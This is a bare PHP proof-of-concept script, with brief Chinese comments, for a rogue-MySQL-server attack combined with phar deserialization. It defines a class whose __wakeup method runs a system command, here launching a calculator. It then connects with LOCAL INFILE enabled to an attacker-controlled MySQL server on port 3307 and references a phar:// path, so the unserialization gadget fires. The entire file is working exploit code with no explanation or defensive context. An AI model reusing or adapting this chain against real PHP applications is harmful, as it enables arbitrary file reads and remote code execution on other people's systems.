<?php
class A {
    public $s = '';
    public function __wakeup () {
        system("calc");
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
mysqli_options($m,MYSQLI_INIT_COMMAND, "select 1;");//连接成功执行的sql语句
$s = mysqli_real_connect($m, '127.0.0.1', '', '', '', 3307);
//$p = mysqli_query($m, 'select 1;');//需要查询
// file_get_contents('phar://./phar.phar');